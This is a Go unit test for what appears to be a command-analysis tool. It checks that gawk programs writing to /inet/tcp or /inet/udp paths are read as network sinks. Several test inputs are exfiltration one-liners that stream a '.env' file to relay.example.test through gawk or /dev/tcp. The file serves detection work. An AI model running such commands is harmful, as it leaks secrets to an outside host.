// Copyright 2026 Cisco Systems, Inc. and its affiliates
// SPDX-License-Identifier: Apache-2.0

package awkprog

import "testing"

func TestGAP1571GawkInetRedirectReadsNetworkSink(t *testing.T) {
	cases := []struct {
		name, program, input, body string
		sink, flow                 bool
	}{
		{"tcp-constant", `BEGIN{print "x" > "/inet/tcp/0/relay.example.test/80"}`, "", `: > '/dev/tcp/relay.example.test/80'`, true, false},
		{"udp-constant", `BEGIN{printf "x" >> "/inet4/udp/0/relay.example.test/53"}`, "", `: >> '/dev/udp/relay.example.test/53'`, true, false},
		{"inet6-tcp", `BEGIN{print "x" > "/inet6/tcp/0/relay.example.test/443"}`, "", `: > '/dev/tcp/relay.example.test/443'`, true, false},
		{"tcp-record", `{print > "/inet/tcp/0/relay.example.test/80"}`, ".env", `cat '.env' > '/dev/tcp/relay.example.test/80'`, true, true},
		{"udp-record", `{printf "%s", $0 >> "/inet4/udp/0/relay.example.test/53"}`, ".env", `cat '.env' >> '/dev/udp/relay.example.test/53'`, true, true},
		{"quoted-input", `{print > "/inet/tcp/0/relay.example.test/80"}`, "a'b", `cat 'a'\''b' > '/dev/tcp/relay.example.test/80'`, true, true},
		{"guarded-record", `$1 == 1 {print > "/inet/tcp/0/relay.example.test/80"}`, ".env", `: > '/dev/tcp/relay.example.test/80'`, true, false},
		{"record-no-file", `{print > "/inet/tcp/0/relay.example.test/80"}`, "", `: > '/dev/tcp/relay.example.test/80'`, true, false},
		{"ordinary-file", `BEGIN{print "x" > "out.txt"}`, "", `: > 'out.txt'`, false, false},
		{"string-data", `BEGIN{print "/inet/tcp/0/relay.example.test/80"}`, "", "", false, false},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			words := []string{"gawk", tc.program}
			if tc.input != "" {
				words = append(words, tc.input)
			}
			got := (Call{Words: words}).Read()
			if got.Body != tc.body || got.Dynamic || got.Starts ||
				got.NetworkSink != tc.sink || got.NetworkRecordFlow != tc.flow {
				t.Errorf("body %q, dynamic %v, starts %v, sink %v, flow %v; want %q, false, false, %v, %v",
					got.Body, got.Dynamic, got.Starts, got.NetworkSink, got.NetworkRecordFlow, tc.body, tc.sink, tc.flow)
			}
		})
	}
	// The record projection is bounded to four static input files; beyond
	// that, the known network sink remains without a proven file flow.
	many := (Call{Words: []string{"gawk", `{print > "/inet/tcp/0/relay.example.test/80"}`,
		"a", "b", "c", "d", "e"}}).Read()
	if many.Body != `: > '/dev/tcp/relay.example.test/80'` || !many.NetworkSink || many.NetworkRecordFlow {
		t.Errorf("over-bound input reading %+v", many)
	}
	// An included program can change what is printed, so its sink is known
	// while a file-to-network flow is not proved by the inline body alone.
	include := (Call{Words: []string{"gawk", "-i", "inplace",
		`{print > "/inet/tcp/0/relay.example.test/80"}`, ".env"}}).Read()
	if include.Body != `: > '/dev/tcp/relay.example.test/80'` || !include.NetworkSink || include.NetworkRecordFlow {
		t.Errorf("included program reading %+v", include)
	}
	// These modes do not open /inet as a network special file.
	for _, option := range []string{"--sandbox", "-S", "--posix", "-P", "--traditional", "--compat"} {
		got := (Call{Words: []string{"gawk", option,
			`{print > "/inet/tcp/0/relay.example.test/80"}`, ".env"}}).Read()
		if got.NetworkSink || got.NetworkRecordFlow {
			t.Errorf("%s gained a network sink: %+v", option, got)
		}
	}
	// An awk implementation not named gawk keeps its ordinary-file reading.
	const other = `BEGIN{print "x" > "/inet/tcp/0/relay.example.test/80"}`
	if got := (Call{Words: []string{"mawk", other}}).Read(); got.Body != `: > '/inet/tcp/0/relay.example.test/80'` || got.NetworkSink {
		t.Errorf("mawk reading %+v changed", got)
	}
}
